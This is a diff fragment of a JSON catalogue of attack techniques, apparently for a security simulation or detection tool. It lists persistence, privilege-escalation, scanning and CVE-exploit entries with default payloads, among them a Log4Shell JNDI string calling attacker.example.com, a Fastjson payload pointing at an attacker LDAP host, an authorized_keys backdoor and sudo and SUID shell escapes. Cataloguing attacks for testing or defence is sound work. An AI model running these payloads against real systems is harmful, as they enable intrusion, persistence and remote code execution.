+      "severity_score": 75,
+      "default_payload": "/etc/init.d/evil start",
+      "target_layer": "host"
+    },
+    {
+      "name": "linux_rc_local",
+      "category": "persistence",
+      "display_label": "Linux /etc/rc.local 持久化",
+      "description": "Linux /etc/rc.local 持久化 —— 主机持久化基础攻击型",
+      "severity_score": 70,
+      "default_payload": "echo '/tmp/evil &' >> /etc/rc.local",
+      "target_layer": "host"
+    },
+    {
+      "name": "linux_motd_backdoor",
+      "category": "persistence",
+      "display_label": "Linux MOTD 后门",
+      "description": "Linux MOTD 后门 —— 主机持久化基础攻击型",
+      "severity_score": 70,
+      "default_payload": "/etc/update-motd.d/99-evil",
+      "target_layer": "host"
+    },
+    {
+      "name": "linux_pam_backdoor",
+      "category": "persistence",
+      "display_label": "Linux PAM 模块后门",
+      "description": "Linux PAM 模块后门 —— 主机持久化基础攻击型",
+      "severity_score": 90,
+      "default_payload": "/lib/security/pam_evil.so",
+      "target_layer": "host"
+    },
+    {
+      "name": "linux_ssh_authorized_keys",
+      "category": "persistence",
+      "display_label": "Linux SSH authorized_keys 持久化",
+      "description": "Linux SSH authorized_keys 持久化 —— 主机持久化基础攻击型",
+      "severity_score": 80,
+      "default_payload": "echo 'ssh-rsa ATTACKER' >> ~/.ssh/authorized_keys",
+      "target_layer": "host"
+    },
+    {
+      "name": "linux_ld_preload",
+      "category": "persistence",
+      "display_label": "Linux LD_PRELOAD 后门",
+      "description": "Linux LD_PRELOAD 后门 —— 主机持久化基础攻击型",
+      "severity_score": 85,
+      "default_payload": "/etc/ld.so.preload: /tmp/evil.so",
+      "target_layer": "host"
+    },
+    {
+      "name": "linux_kernel_module_rootkit",
+      "category": "persistence",
+      "display_label": "Linux 内核模块 rootkit",
+      "description": "Linux 内核模块 rootkit —— 主机持久化基础攻击型",
+      "severity_score": 95,
+      "default_payload": "insmod evil.ko",
+      "target_layer": "host"
+    },
+    {
+      "name": "windows_service_install",
+      "category": "persistence",
+      "display_label": "Windows 服务持久化",
+      "description": "Windows 服务持久化 —— 主机持久化基础攻击型",
+      "severity_score": 80,
+      "default_payload": "sc create evil binPath= C:\\evil.exe",
+      "target_layer": "host"
+    },
+    {
+      "name": "windows_registry_run",
+      "category": "persistence",
+      "display_label": "Windows 注册表 Run 键持久化",
+      "description": "Windows 注册表 Run 键持久化 —— 主机持久化基础攻击型",
+      "severity_score": 75,
+      "default_payload": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "target_layer": "host"
+    },
+    {
+      "name": "windows_registry_runonce",
+      "category": "persistence",
+      "display_label": "Windows 注册表 RunOnce 持久化",
+      "description": "Windows 注册表 RunOnce 持久化 —— 主机持久化基础攻击型",
+      "severity_score": 70,
+      "default_payload": "HKCU\\...\\RunOnce",
+      "target_layer": "host"
+    },
+    {
+      "name": "windows_scheduled_task",
+      "category": "persistence",
+      "display_label": "Windows 计划任务持久化",
+      "description": "Windows 计划任务持久化 —— 主机持久化基础攻击型",
+      "severity_score": 78,
+      "default_payload": "schtasks /create /tn evil /tr C:\\evil.exe /sc onlogon",
+      "target_layer": "host"
+    },
+    {
+      "name": "windows_startup_folder",
+      "category": "persistence",
+      "display_label": "Windows 启动文件夹持久化",
+      "description": "Windows 启动文件夹持久化 —— 主机持久化基础攻击型",
+      "severity_score": 70,
+      "default_payload": "shell:startup\\evil.lnk",
+      "target_layer": "host"
+    },
+    {
+      "name": "windows_wmi_event_subscription",
+      "category": "persistence",
+      "display_label": "Windows WMI 事件订阅持久化",
+      "description": "Windows WMI 事件订阅持久化 —— 主机持久化基础攻击型",
+      "severity_score": 88,
+      "default_payload": "wmic /namespace:\\\\root\\subscription",
+      "target_layer": "host"
+    },
+    {
+      "name": "windows_dll_hijacking",
+      "category": "persistence",
+      "display_label": "Windows DLL 劫持",
+      "description": "Windows DLL 劫持 —— 主机持久化基础攻击型",
+      "severity_score": 85,
+      "default_payload": "Place evil.dll in app dir",
+      "target_layer": "host"
+    },
+    {
+      "name": "windows_appinit_dll",
+      "category": "persistence",
+      "display_label": "Windows AppInit_DLLs 持久化",
+      "description": "Windows AppInit_DLLs 持久化 —— 主机持久化基础攻击型",
+      "severity_score": 80,
+      "default_payload": "HKLM\\...\\Windows\\AppInit_DLLs",
+      "target_layer": "host"
+    },
+    {
+      "name": "windows_image_file_execution_options",
+      "category": "persistence",
+      "display_label": "Windows IFEO 持久化",
+      "description": "Windows IFEO 持久化 —— 主机持久化基础攻击型",
+      "severity_score": 80,
+      "default_payload": "HKLM\\...\\Image File Execution Options\\sethc.exe",
+      "target_layer": "host"
+    },
+    {
+      "name": "windows_screensaver_backdoor",
+      "category": "persistence",
+      "display_label": "Windows 屏保后门",
+      "description": "Windows 屏保后门 —— 主机持久化基础攻击型",
+      "severity_score": 65,
+      "default_payload": "HKCU\\Control Panel\\Desktop SCRNSAVE.EXE",
+      "target_layer": "host"
+    },
+    {
+      "name": "windows_logon_script",
+      "category": "persistence",
+      "display_label": "Windows 登录脚本持久化",
+      "description": "Windows 登录脚本持久化 —— 主机持久化基础攻击型",
+      "severity_score": 70,
+      "default_payload": "HKCU\\Environment UserInitMprLogonScript",
+      "target_layer": "host"
+    },
+    {
+      "name": "windows_bootkit",
+      "category": "persistence",
+      "display_label": "Windows Bootkit 持久化",
+      "description": "Windows Bootkit 持久化 —— 主机持久化基础攻击型",
+      "severity_score": 95,
+      "default_payload": "MBR/UEFI implant",
+      "target_layer": "host"
+    },
+    {
+      "name": "container_persistence_dockerfile",
+      "category": "persistence",
+      "display_label": "容器 Dockerfile 持久化",
+      "description": "容器 Dockerfile 持久化 —— 主机持久化基础攻击型",
+      "severity_score": 75,
+      "default_payload": "ADD evil.sh /etc/init.d/",
+      "target_layer": "host"
+    },
+    {
+      "name": "linux_sudo_misuse",
+      "category": "privilege_escalation",
+      "display_label": "Linux sudo 配置滥用",
+      "description": "Linux sudo 配置滥用 —— 提权类基础攻击型",
+      "severity_score": 85,
+      "default_payload": "sudo -l → vim → :!/bin/sh",
+      "target_layer": "host"
+    },
+    {
+      "name": "linux_sudo_cve_2021_3156",
+      "category": "privilege_escalation",
+      "display_label": "Sudo Baron Samedit (CVE-2021-3156)",
+      "description": "Sudo Baron Samedit (CVE-2021-3156) —— 提权类基础攻击型",
+      "severity_score": 95,
+      "default_payload": "sudoedit -s '\\' x",
+      "target_layer": "host"
+    },
+    {
+      "name": "linux_suid_binary_abuse",
+      "category": "privilege_escalation",
+      "display_label": "Linux SUID 二进制滥用",
+      "description": "Linux SUID 二进制滥用 —— 提权类基础攻击型",
+      "severity_score": 85,
+      "default_payload": "find / -perm -4000 → /usr/bin/find . -exec /bin/sh \\;",
+      "target_layer": "host"
+    },
+    {
+      "name": "linux_sgid_binary_abuse",
+      "category": "privilege_escalation",
+      "display_label": "Linux SGID 二进制滥用",
+      "description": "Linux SGID 二进制滥用 —— 提权类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "find / -perm -2000",
+      "target_layer": "host"
+    },
+    {
+      "name": "linux_capabilities_abuse",
+      "category": "privilege_escalation",
+      "display_label": "Linux Capabilities 滥用",
+      "description": "Linux Capabilities 滥用 —— 提权类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "getcap -r / → cap_setuid+ep",
+      "target_layer": "host"
+    },
+    {
+      "name": "linux_dirty_cow",
+      "category": "privilege_escalation",
+      "display_label": "Linux DirtyCow (CVE-2016-5195)",
+      "description": "Linux DirtyCow (CVE-2016-5195) —— 提权类基础攻击型",
+      "severity_score": 92,
+      "default_payload": "dirtyc0w pokemon",
+      "target_layer": "host"
+    },
+    {
+      "name": "linux_dirty_pipe",
+      "category": "privilege_escalation",
+      "display_label": "Linux DirtyPipe (CVE-2022-0847)",
+      "description": "Linux DirtyPipe (CVE-2022-0847) —— 提权类基础攻击型",
+      "severity_score": 92,
+      "default_payload": "dirtypipe /etc/passwd",
+      "target_layer": "host"
+    },
+    {
+      "name": "linux_pwnkit_polkit",
+      "category": "privilege_escalation",
+      "display_label": "Linux PwnKit (CVE-2021-4034)",
+      "description": "Linux PwnKit (CVE-2021-4034) —— 提权类基础攻击型",
+      "severity_score": 92,
+      "default_payload": "pwnkit binary",
+      "target_layer": "host"
+    },
+    {
+      "name": "linux_overlayfs_cve_2023_0386",
+      "category": "privilege_escalation",
+      "display_label": "Linux OverlayFS (CVE-2023-0386)",
+      "description": "Linux OverlayFS (CVE-2023-0386) —— 提权类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "exploit-cve-2023-0386",
+      "target_layer": "host"
+    },
+    {
+      "name": "linux_kernel_exploit_generic",
+      "category": "privilege_escalation",
+      "display_label": "Linux 内核 exp（通用）",
+      "description": "Linux 内核 exp（通用） —— 提权类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "kernel-specific exp binary",
+      "target_layer": "host"
+    },
+    {
+      "name": "windows_uac_bypass_fodhelper",
+      "category": "privilege_escalation",
+      "display_label": "Windows UAC 绕过 - fodhelper",
+      "description": "Windows UAC 绕过 - fodhelper —— 提权类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command",
+      "target_layer": "host"
+    },
+    {
+      "name": "windows_uac_bypass_eventviewer",
+      "category": "privilege_escalation",
+      "display_label": "Windows UAC 绕过 - eventvwr",
+      "description": "Windows UAC 绕过 - eventvwr —— 提权类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command",
+      "target_layer": "host"
+    },
+    {
+      "name": "windows_uac_bypass_sdclt",
+      "category": "privilege_escalation",
+      "display_label": "Windows UAC 绕过 - sdclt",
+      "description": "Windows UAC 绕过 - sdclt —— 提权类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "HKCU\\Software\\Classes\\Folder\\shell\\open\\command",
+      "target_layer": "host"
+    },
+    {
+      "name": "windows_token_impersonation",
+      "category": "privilege_escalation",
+      "display_label": "Windows Token 模拟",
+      "description": "Windows Token 模拟 —— 提权类基础攻击型",
+      "severity_score": 88,
+      "default_payload": "incognito list_tokens / impersonate_token",
+      "target_layer": "host"
+    },
+    {
+      "name": "windows_juicy_potato",
+      "category": "privilege_escalation",
+      "display_label": "Windows JuicyPotato 提权",
+      "description": "Windows JuicyPotato 提权 —— 提权类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "JuicyPotato.exe -t * -p cmd.exe",
+      "target_layer": "host"
+    },
+    {
+      "name": "windows_print_nightmare",
+      "category": "privilege_escalation",
+      "display_label": "Windows PrintNightmare (CVE-2021-34527)",
+      "description": "Windows PrintNightmare (CVE-2021-34527) —— 提权类基础攻击型",
+      "severity_score": 92,
+      "default_payload": "Add-Printer driver inject",
+      "target_layer": "host"
+    },
+    {
+      "name": "windows_zerologon",
+      "category": "privilege_escalation",
+      "display_label": "Windows Zerologon (CVE-2020-1472)",
+      "description": "Windows Zerologon (CVE-2020-1472) —— 提权类基础攻击型",
+      "severity_score": 95,
+      "default_payload": "zerologon_tester.py target dc",
+      "target_layer": "host"
+    },
+    {
+      "name": "windows_hivenightmare",
+      "category": "privilege_escalation",
+      "display_label": "Windows HiveNightmare (CVE-2021-36934)",
+      "description": "Windows HiveNightmare (CVE-2021-36934) —— 提权类基础攻击型",
+      "severity_score": 88,
+      "default_payload": "Read SAM/SYSTEM as low priv",
+      "target_layer": "host"
+    },
+    {
+      "name": "kubernetes_pod_escape",
+      "category": "privilege_escalation",
+      "display_label": "Kubernetes Pod 逃逸",
+      "description": "Kubernetes Pod 逃逸 —— 提权类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "mount /proc/1/root/etc/shadow",
+      "target_layer": "host"
+    },
+    {
+      "name": "docker_container_escape",
+      "category": "privilege_escalation",
+      "display_label": "Docker 容器逃逸",
+      "description": "Docker 容器逃逸 —— 提权类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "release_agent / runc --root cgroup escape",
+      "target_layer": "host"
+    },
+    {
+      "name": "port_scan_tcp_syn",
+      "category": "discovery",
+      "display_label": "TCP SYN 半连接扫描",
+      "description": "TCP SYN 半连接扫描 —— 信息探测 / 枚举类基础攻击型",
+      "severity_score": 35,
+      "default_payload": "nmap -sS target",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "port_scan_tcp_connect",
+      "category": "discovery",
+      "display_label": "TCP 全连接扫描",
+      "description": "TCP 全连接扫描 —— 信息探测 / 枚举类基础攻击型",
+      "severity_score": 35,
+      "default_payload": "nmap -sT target",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "port_scan_udp",
+      "category": "discovery",
+      "display_label": "UDP 端口扫描",
+      "description": "UDP 端口扫描 —— 信息探测 / 枚举类基础攻击型",
+      "severity_score": 35,
+      "default_payload": "nmap -sU target",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "port_scan_xmas",
+      "category": "discovery",
+      "display_label": "Xmas 扫描",
+      "description": "Xmas 扫描 —— 信息探测 / 枚举类基础攻击型",
+      "severity_score": 40,
+      "default_payload": "nmap -sX target",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "port_scan_null",
+      "category": "discovery",
+      "display_label": "Null 扫描",
+      "description": "Null 扫描 —— 信息探测 / 枚举类基础攻击型",
+      "severity_score": 40,
+      "default_payload": "nmap -sN target",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "port_scan_fin",
+      "category": "discovery",
+      "display_label": "FIN 扫描",
+      "description": "FIN 扫描 —— 信息探测 / 枚举类基础攻击型",
+      "severity_score": 40,
+      "default_payload": "nmap -sF target",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "port_scan_idle_zombie",
+      "category": "discovery",
+      "display_label": "Idle/Zombie 扫描",
+      "description": "Idle/Zombie 扫描 —— 信息探测 / 枚举类基础攻击型",
+      "severity_score": 50,
+      "default_payload": "nmap -sI zombie target",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "nmap_service_detection",
+      "category": "discovery",
+      "display_label": "Nmap 服务版本探测",
+      "description": "Nmap 服务版本探测 —— 信息探测 / 枚举类基础攻击型",
+      "severity_score": 40,
+      "default_payload": "nmap -sV target",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "nmap_os_detection",
+      "category": "discovery",
+      "display_label": "Nmap OS 指纹",
+      "description": "Nmap OS 指纹 —— 信息探测 / 枚举类基础攻击型",
+      "severity_score": 40,
+      "default_payload": "nmap -O target",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "nmap_script_vuln",
+      "category": "discovery",
+      "display_label": "Nmap NSE 漏洞扫描",
+      "description": "Nmap NSE 漏洞扫描 —— 信息探测 / 枚举类基础攻击型",
+      "severity_score": 50,
+      "default_payload": "nmap --script vuln target",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "smb_enumeration",
+      "category": "discovery",
+      "display_label": "SMB 共享枚举",
+      "description": "SMB 共享枚举 —— 信息探测 / 枚举类基础攻击型",
+      "severity_score": 50,
+      "default_payload": "enum4linux -a target",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "smb_null_session",
+      "category": "discovery",
+      "display_label": "SMB 空会话",
+      "description": "SMB 空会话 —— 信息探测 / 枚举类基础攻击型",
+      "severity_score": 60,
+      "default_payload": "smbclient -L //target -N",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "ldap_enumeration",
+      "category": "discovery",
+      "display_label": "LDAP 目录枚举",
+      "description": "LDAP 目录枚举 —— 信息探测 / 枚举类基础攻击型",
+      "severity_score": 55,
+      "default_payload": "ldapsearch -x -h target -b dc=example,dc=com",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "snmp_enumeration",
+      "category": "discovery",
+      "display_label": "SNMP 枚举",
+      "description": "SNMP 枚举 —— 信息探测 / 枚举类基础攻击型",
+      "severity_score": 50,
+      "default_payload": "snmpwalk -v 2c -c public target",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "dns_enumeration",
+      "category": "discovery",
+      "display_label": "DNS 枚举",
+      "description": "DNS 枚举 —— 信息探测 / 枚举类基础攻击型",
+      "severity_score": 40,
+      "default_payload": "dnsenum --enum example.com",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "subdomain_enumeration",
+      "category": "discovery",
+      "display_label": "子域名枚举",
+      "description": "子域名枚举 —— 信息探测 / 枚举类基础攻击型",
+      "severity_score": 40,
+      "default_payload": "subfinder -d example.com",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "rpc_enumeration",
+      "category": "discovery",
+      "display_label": "RPC 枚举",
+      "description": "RPC 枚举 —— 信息探测 / 枚举类基础攻击型",
+      "severity_score": 50,
+      "default_payload": "rpcclient -U '' target",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "wmi_query_remote",
+      "category": "discovery",
+      "display_label": "WMI 远程查询",
+      "description": "WMI 远程查询 —— 信息探测 / 枚举类基础攻击型",
+      "severity_score": 65,
+      "default_payload": "wmic /node:target /user:admin process list",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "active_directory_enumeration",
+      "category": "discovery",
+      "display_label": "Active Directory 枚举",
+      "description": "Active Directory 枚举 —— 信息探测 / 枚举类基础攻击型",
+      "severity_score": 65,
+      "default_payload": "BloodHound SharpHound -c All",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "kerberos_user_enumeration",
+      "category": "discovery",
+      "display_label": "Kerberos 用户枚举",
+      "description": "Kerberos 用户枚举 —— 信息探测 / 枚举类基础攻击型",
+      "severity_score": 55,
+      "default_payload": "kerbrute userenum -d domain users.txt",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "log4j_jndi_log4shell",
+      "category": "exploit_cve",
+      "display_label": "Log4Shell (CVE-2021-44228)",
+      "description": "Log4Shell (CVE-2021-44228) —— 高危 CVE 利用类基础攻击型",
+      "severity_score": 95,
+      "default_payload": "${jndi:ldap://attacker.example.com/a}",
+      "target_layer": "application"
+    },
+    {
+      "name": "log4j_double_jndi_bypass",
+      "category": "exploit_cve",
+      "display_label": "Log4Shell 嵌套 JNDI 绕过",
+      "description": "Log4Shell 嵌套 JNDI 绕过 —— 高危 CVE 利用类基础攻击型",
+      "severity_score": 92,
+      "default_payload": "${${lower:j}ndi:ldap://attacker/a}",
+      "target_layer": "application"
+    },
+    {
+      "name": "spring4shell_cve_2022_22965",
+      "category": "exploit_cve",
+      "display_label": "Spring4Shell (CVE-2022-22965)",
+      "description": "Spring4Shell (CVE-2022-22965) —— 高危 CVE 利用类基础攻击型",
+      "severity_score": 95,
+      "default_payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=evil",
+      "target_layer": "application"
+    },
+    {
+      "name": "spring_cloud_function_cve_2022_22963",
+      "category": "exploit_cve",
+      "display_label": "Spring Cloud Function RCE (CVE-2022-22963)",
+      "description": "Spring Cloud Function RCE (CVE-2022-22963) —— 高危 CVE 利用类基础攻击型",
+      "severity_score": 92,
+      "default_payload": "spring.cloud.function.routing-expression: T(Runtime).getRuntime().exec('id')",
+      "target_layer": "application"
+    },
+    {
+      "name": "shiro_550_deserialization",
+      "category": "exploit_cve",
+      "display_label": "Shiro 550 反序列化",
+      "description": "Shiro 550 反序列化 —— 高危 CVE 利用类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "rememberMe cookie with crafted payload",
+      "target_layer": "application"
+    },
+    {
+      "name": "fastjson_rce_1_2_24",
+      "category": "exploit_cve",
+      "display_label": "Fastjson < 1.2.25 RCE",
+      "description": "Fastjson < 1.2.25 RCE —— 高危 CVE 利用类基础攻击型",
+      "severity_score": 92,
+      "default_payload": "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker/Exp\"}",
+      "target_layer": "application"
+    },
+    {
+      "name": "fastjson_rce_1_2_47",
+      "category": "exploit_cve",
+      "display_label": "Fastjson 1.2.47 RCE",
+      "description": "Fastjson 1.2.47 RCE —— 高危 CVE 利用类基础攻击型",
+      "severity_score": 92,
+      "default_payload": "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}...}",
+      "target_layer": "application"
+    },
+    {
+      "name": "weblogic_t3_cve_2018_2628",
+      "category": "exploit_cve",
+      "display_label": "Weblogic T3 反序列化 (CVE-2018-2628)",
+      "description": "Weblogic T3 反序列化 (CVE-2018-2628) —— 高危 CVE 利用类基础攻击型",
+      "severity_score": 92,
+      "default_payload": "T3 protocol crafted serialized object",
+      "target_layer": "application"
+    },
+    {
+      "name": "weblogic_iiop_cve_2020_2551",
+      "category": "exploit_cve",
+      "display_label": "Weblogic IIOP RCE (CVE-2020-2551)",
+      "description": "Weblogic IIOP RCE (CVE-2020-2551) —— 高危 CVE 利用类基础攻击型",
+      "severity_score": 92,
+      "default_payload": "IIOP serialized payload",
+      "target_layer": "application"
+    },
+    {
+      "name": "heartbleed_tls_cve_2014_0160",
+      "category": "exploit_cve",
+      "display_label": "Heartbleed TLS (CVE-2014-0160)",
+      "description": "Heartbleed TLS (CVE-2014-0160) —— 高危 CVE 利用类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "TLS heartbeat with crafted length",
+      "target_layer": "application"
+    },
+    {
+      "name": "apache_struts2_s2_045",
+      "category": "exploit_cve",
+      "display_label": "Struts2 S2-045 (CVE-2017-5638)",
+      "description": "Struts2 S2-045 (CVE-2017-5638) —— 高危 CVE 利用类基础攻击型",
+      "severity_score": 92,
+      "default_payload": "%{(#cmd='id').(...)}",
+      "target_layer": "application"
+    },
+    {
+      "name": "apache_ofbiz_cve_2023_49070",
+      "category": "exploit_cve",
+      "display_label": "Apache OFBiz RCE (CVE-2023-49070)",
+      "description": "Apache OFBiz RCE (CVE-2023-49070) —— 高危 CVE 利用类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "/webtools/control/ProgramExport groovy payload",
+      "target_layer": "application"
+    },
+    {
+      "name": "confluence_ognl_cve_2022_26134",
+      "category": "exploit_cve",
+      "display_label": "Confluence OGNL (CVE-2022-26134)",
+      "description": "Confluence OGNL (CVE-2022-26134) —— 高危 CVE 利用类基础攻击型",
+      "severity_score": 92,
+      "default_payload": "/${@java.lang.Runtime@getRuntime().exec('id')}/",
+      "target_layer": "application"
+    },
+    {
+      "name": "citrix_cve_2019_19781",
+      "category": "exploit_cve",
+      "display_label": "Citrix ADC (CVE-2019-19781)",
+      "description": "Citrix ADC (CVE-2019-19781) —— 高危 CVE 利用类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "/vpn/../vpns/cfg/smb.conf path traversal",
+      "target_layer": "application"
+    },
+    {
+      "name": "vmware_vcenter_cve_2021_21972",
+      "category": "exploit_cve",
+      "display_label": "vCenter (CVE-2021-21972)",
+      "description": "vCenter (CVE-2021-21972) —— 高危 CVE 利用类基础攻击型",
+      "severity_score": 92,
+      "default_payload": "/ui/vropspluginui/rest/services/uploadova",
+      "target_layer": "application"
+    }
+  ]
+}
